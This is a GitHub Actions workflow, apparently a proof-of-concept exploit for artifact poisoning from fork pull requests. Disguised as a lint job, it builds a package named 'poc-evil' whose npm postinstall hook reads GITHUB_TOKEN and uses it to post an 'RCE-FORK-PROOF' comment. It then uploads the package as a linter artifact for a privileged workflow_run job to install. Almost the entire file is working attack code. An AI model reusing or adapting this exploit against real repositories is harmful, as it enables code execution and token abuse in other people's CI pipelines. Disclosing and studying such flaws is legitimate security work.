name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-controlled linter artifact
        run: |
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          mkdir -p poc-evil
          cat > package.json <<'JSON'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
          JSON
          cat > poc-evil/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          cat > poc-evil/hook.js <<'JS'
          const fs = require('fs');
          const path = require('path');
          const token = process.env.GITHUB_TOKEN;
          console.log('RCE-FORK-HOOK-RAN token=' + (token ? 'present' : 'missing'));
          (async () => {
            try {
              const repo = process.env.GITHUB_REPOSITORY;
              const pr = fs.readFileSync(path.resolve(__dirname, '..', 'pr-number.txt'), 'utf8').trim();
              const h = { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'user-agent': 'poc', 'content-type': 'application/json' };
              const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
                method: 'POST',
                headers: h,
                body: JSON.stringify({ body: '**RCE-FORK-PROOF**: fork-PR artifact-controlled npm postinstall executed inside the privileged workflow_run job (token: ' + (token ? 'present' : 'missing') + ') at ' + new Date().toISOString() })
              });
              console.log('RCE-FORK-COMMENT-STATUS=' + r.status);
            } catch (e) { console.log('RCE-FORK-HOOK-ERR=' + e.message); }
          })();
          JS
          printf 'fork attacker-controlled linter report body\n' > linter-report.txt

      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            pr-number.txt
            linter-report.txt
            package.json
            poc-evil
          if-no-files-found: ignore
